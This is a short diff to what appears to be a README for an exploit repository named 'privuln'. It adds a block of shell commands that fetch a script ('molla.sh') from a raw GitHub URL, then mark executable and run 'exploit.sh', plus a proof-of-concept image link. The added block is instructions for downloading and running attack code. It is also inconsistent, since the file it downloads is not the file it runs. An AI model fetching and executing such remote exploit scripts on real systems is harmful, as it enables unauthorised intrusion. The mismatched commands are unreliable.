@@ -16,3 +16,11 @@ chmod +x exploit.sh
 ```
 ### Proof of Concept
 <img src="https://raw.githubusercontent.com/1337r0j4n/privuln/main/exploit.jpeg">
+
+```
+wget https://raw.githubusercontent.com/1337r0j4n/privuln/main/molla.sh
+chmod +x exploit.sh
+./exploit.sh
+```
+### Proof of Concept
+<img src="https://raw.githubusercontent.com/1337r0j4n/privuln/main/molla-exploit-poc.png">
